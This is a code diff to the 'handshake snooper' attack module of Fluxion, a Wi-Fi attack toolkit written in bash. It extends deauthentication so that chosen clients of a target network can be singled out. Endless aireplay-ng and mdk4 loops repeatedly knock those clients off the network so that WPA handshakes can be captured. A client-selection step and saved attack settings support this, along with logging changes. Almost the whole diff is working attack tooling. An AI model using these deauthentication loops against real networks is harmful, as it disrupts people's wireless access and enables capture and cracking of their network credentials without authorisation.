@@ -92,7 +92,7 @@ handshake_snooper_arbiter_daemon() {
           $FLUXIONOutputDevice
       else
         mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
-           "$FLUXIONWorkspacePath/capture/recent.cap" &> $FLUXIONOutputDevice
+           "$FLUXIONWorkspacePath/capture/recent.cap" &>> $FLUXIONOutputDevice
       fi
     fi
 
@@ -147,7 +147,7 @@ handshake_snooper_arbiter_daemon() {
 
 handshake_snooper_stop_captor() {
   if [ "$HandshakeSnooperCaptorPID" ]; then
-    kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
+    kill -s SIGINT $HandshakeSnooperCaptorPID &>> $FLUXIONOutputDevice
   fi
 
   HandshakeSnooperCaptorPID=""
@@ -162,16 +162,16 @@ handshake_snooper_start_captor() {
   # Ensure jammer interface is in monitor mode and UP before starting captor
   # This prevents "interface down" errors during tracker restarts
   # Only set mode if not already in monitor mode to avoid disrupting the interface
-  echo "Verifying captor interface monitor mode..." > $FLUXIONOutputDevice
+  echo "Verifying captor interface monitor mode..." >> $FLUXIONOutputDevice
   local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
   if [ "$currentMode" != "monitor" ]; then
-    echo "Setting captor interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
-    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &> $FLUXIONOutputDevice; then
-      echo "Warning: Failed to set captor interface to monitor mode" > $FLUXIONOutputDevice
+    echo "Setting captor interface to monitor mode (current: $currentMode)..." >> $FLUXIONOutputDevice
+    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &>> $FLUXIONOutputDevice; then
+      echo "Warning: Failed to set captor interface to monitor mode" >> $FLUXIONOutputDevice
     fi
     sleep 1
   else
-    echo "Captor interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
+    echo "Captor interface already in monitor mode, skipping..." >> $FLUXIONOutputDevice
   fi
 
   local parentPID
@@ -188,10 +188,11 @@ handshake_snooper_start_captor() {
 
 handshake_snooper_stop_deauthenticator() {
   if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
-    kill $HandshakeSnooperDeauthenticatorPID &> $FLUXIONOutputDevice
+    kill $HandshakeSnooperDeauthenticatorPID &>> $FLUXIONOutputDevice
   fi
 
   HandshakeSnooperDeauthenticatorPID=""
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 }
 
 handshake_snooper_start_deauthenticator() {
@@ -203,29 +204,67 @@ handshake_snooper_start_deauthenticator() {
   # Ensure jammer interface is in monitor mode before starting
   # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
   # Only set mode if not already in monitor mode to avoid disrupting the interface
-  echo "Verifying jammer interface monitor mode..." > $FLUXIONOutputDevice
+  echo "Verifying jammer interface monitor mode..." >> $FLUXIONOutputDevice
   local currentMode=$(iw dev "$HandshakeSnooperJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
   if [ "$currentMode" != "monitor" ]; then
-    echo "Setting jammer interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
-    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &> $FLUXIONOutputDevice; then
-      echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
+    echo "Setting jammer interface to monitor mode (current: $currentMode)..." >> $FLUXIONOutputDevice
+    if ! interface_set_mode "$HandshakeSnooperJammerInterface" monitor &>> $FLUXIONOutputDevice; then
+      echo "Warning: Failed to set jammer interface to monitor mode" >> $FLUXIONOutputDevice
     fi
     sleep 1
   else
-    echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
+    echo "Jammer interface already in monitor mode, skipping..." >> $FLUXIONOutputDevice
+  fi
+
+  local targetClients=""
+  local targetMode="all"
+  case "$HandshakeSnooperTargetClients" in
+    broadcast|"")
+      targetMode="broadcast"
+      ;;
+    all)
+      targetMode="all"
+      targetClients="${FluxionTargetClientsMAC[*]}"
+      ;;
+    *)
+      targetMode="subset"
+      targetClients="$HandshakeSnooperTargetClients"
+      ;;
+  esac
+
+  if [ "$targetMode" = "all" ] && [ ! "$targetClients" ]; then
+    targetMode="broadcast"
+  fi
+
+  local deauthWindowTitle="Deauthenticating all clients on $FluxionTargetSSID"
+  if [ "$targetMode" = "subset" ]; then
+    deauthWindowTitle="Deauthenticating selected clients on $FluxionTargetSSID"
   fi
 
   # Start deauthenticators.
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
-      fluxion_window_open HandshakeSnooperDeauthenticatorPID \
-        "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
-        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done"
+      if [ "$targetClients" ]; then
+        fluxion_window_open HandshakeSnooperDeauthenticatorPID \
+          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
+          "while true; do sleep 7; for client in $targetClients; do timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC -c \$client --ignore-negative-one $HandshakeSnooperJammerInterface; done; done"
+      else
+        fluxion_window_open HandshakeSnooperDeauthenticatorPID \
+          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
+          "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done"
+      fi
     ;;
     "$HandshakeSnooperMdk4MethodOption")
-      fluxion_window_open HandshakeSnooperDeauthenticatorPID \
-        "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
-        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -B $FluxionTargetMAC -c $FluxionTargetChannel; done"
+      if [ "$targetMode" = "subset" ]; then
+        printf '%s\n' $targetClients > "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+        fluxion_window_open HandshakeSnooperDeauthenticatorPID \
+          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
+          "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\" -c $FluxionTargetChannel; done"
+      else
+        fluxion_window_open HandshakeSnooperDeauthenticatorPID \
+          "$deauthWindowTitle" "$BOTTOMRIGHT" "#000000" "#FF0009" \
+          "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -B $FluxionTargetMAC -c $FluxionTargetChannel; done"
+      fi
     ;;
   esac
 }
@@ -269,6 +308,51 @@ handshake_snooper_set_deauthenticator_identifier() {
   fi
 }
 
+handshake_snooper_unset_deauth_target() {
+  if [ ! "$HandshakeSnooperTargetClients" ]; then return 1; fi
+  HandshakeSnooperTargetClients=""
+}
+
+handshake_snooper_set_deauth_target() {
+  if [ "$HandshakeSnooperTargetClients" ]; then return 0; fi
+
+  handshake_snooper_unset_deauth_target
+
+  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
+    "$HandshakeSnooperMonitorMethodOption" ]; then
+    HandshakeSnooperTargetClients="broadcast"
+    return 0
+  fi
+
+  if ! interface_is_wireless "$HandshakeSnooperJammerInterface"; then
+    HandshakeSnooperTargetClients="broadcast"
+    return 0
+  fi
+
+  if [ "$FLUXIONAuto" ]; then
+    HandshakeSnooperTargetClients="broadcast"
+    return 0
+  fi
+
+  if [ "$FluxionTargetClientsScanned" != "${FluxionTargetMAC^^}:$FluxionTargetChannel" ]; then
+    echo -e "$FLUXIONVLine $FLUXIONStartingScannerNotice"
+    fluxion_target_scan_clients \
+      "$HandshakeSnooperJammerInterface" "$FluxionTargetMAC" "$FluxionTargetChannel"
+  fi
+
+  local broadcastCapable=0
+  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
+    "$HandshakeSnooperAireplayMethodOption" ]; then
+    broadcastCapable=1
+  fi
+
+  local selectedClients
+  if ! fluxion_target_select_clients selectedClients "$broadcastCapable"; then
+    return 1
+  fi
+  HandshakeSnooperTargetClients="${selectedClients:-broadcast}"
+}
+
 handshake_snooper_unset_jammer_interface() {
   if [ ! "$HandshakeSnooperJammerInterface" ]; then
     HandshakeSnooperJammerInterfaceOriginal=""
@@ -300,10 +384,10 @@ handshake_snooper_set_jammer_interface() {
   #  "$HandshakeSnooperMonitorMethodOption" ]; then return 0; fi
 
   if [ ! "$HandshakeSnooperJammerInterfaceOriginal" ]; then
-    echo "Running get jammer interface." > $FLUXIONOutputDevice
+    echo "Running get jammer interface." >> $FLUXIONOutputDevice
     if ! fluxion_get_interface attack_targetting_interfaces \
       "$HandshakeSnooperJammerInterfaceQuery"; then
-      echo "Failed to get jammer interface" > $FLUXIONOutputDevice
+      echo "Failed to get jammer interface" >> $FLUXIONOutputDevice
       return 1
     fi
     HandshakeSnooperJammerInterfaceOriginal=$FluxionInterfaceSelected
@@ -323,11 +407,11 @@ handshake_snooper_set_jammer_interface() {
   fi
 
   if ! fluxion_allocate_interface $selectedInterface; then
-    echo "Failed to allocate jammer interface" > $FLUXIONOutputDevice
+    echo "Failed to allocate jammer interface" >> $FLUXIONOutputDevice
     return 2
   fi
 
-  echo "Succeeded get jammer interface." > $FLUXIONOutputDevice
+  echo "Succeeded get jammer interface." >> $FLUXIONOutputDevice
 
   # Use the renamed monitor interface (e.g. fluxwl0), not the original name.
   local jammerIface=${FluxionInterfaces[$selectedInterface]:-$selectedInterface}
@@ -523,6 +607,7 @@ unprep_attack() {
   handshake_snooper_unset_verifier_synchronicity
   handshake_snooper_unset_verifier_interval
   handshake_snooper_unset_verifier_identifier
+  handshake_snooper_unset_deauth_target
   handshake_snooper_unset_jammer_interface
   handshake_snooper_unset_deauthenticator_identifier
 
@@ -542,6 +627,7 @@ prep_attack() {
   local sequence=(
     "set_deauthenticator_identifier"
     "set_jammer_interface"
+    "set_deauth_target"
     "set_verifier_identifier"
     "set_verifier_interval"
     "set_verifier_synchronicity"
@@ -565,23 +651,25 @@ load_attack() {
   HandshakeSnooperVerifierIdentifier=${configuration[2]}
   HandshakeSnooperVerifierInterval=${configuration[3]}
   HandshakeSnooperVerifierSynchronicity=${configuration[4]}
+  HandshakeSnooperTargetClients=${configuration[5]:-broadcast}
 }
 
 save_attack() {
   local -r configurationPath=$1
 
   # Store/overwrite attack configuration for pause & resume.
-  # Order: DeauthID, JammerWI, VerifId, VerifInt, VerifSync
+  # Order: DeauthID, JammerWI, VerifId, VerifInt, VerifSync, TargetClients
   echo "$HandshakeSnooperDeauthenticatorIdentifier" > "$configurationPath"
   echo "$HandshakeSnooperJammerInterfaceOriginal" >> "$configurationPath"
   echo "$HandshakeSnooperVerifierIdentifier" >> "$configurationPath"
   echo "$HandshakeSnooperVerifierInterval" >> "$configurationPath"
   echo "$HandshakeSnooperVerifierSynchronicity" >> "$configurationPath"
+  echo "$HandshakeSnooperTargetClients" >> "$configurationPath"
 }
 
 stop_attack() {
   if [ "$HandshakeSnooperArbiterPID" ]; then
-    kill -s SIGABRT $HandshakeSnooperArbiterPID &> $FLUXIONOutputDevice
+    kill -s SIGABRT $HandshakeSnooperArbiterPID &>> $FLUXIONOutputDevice
   fi
 
   HandshakeSnooperArbiterPID=""
@@ -594,7 +682,7 @@ start_attack() {
   if [ "$HandshakeSnooperState" != "Ready" ]; then return 1; fi
   HandshakeSnooperState="Running"
 
-  handshake_snooper_arbiter_daemon $$ &> $FLUXIONOutputDevice &
+  handshake_snooper_arbiter_daemon $$ &>> $FLUXIONOutputDevice &
   HandshakeSnooperArbiterPID=$!
 }
 
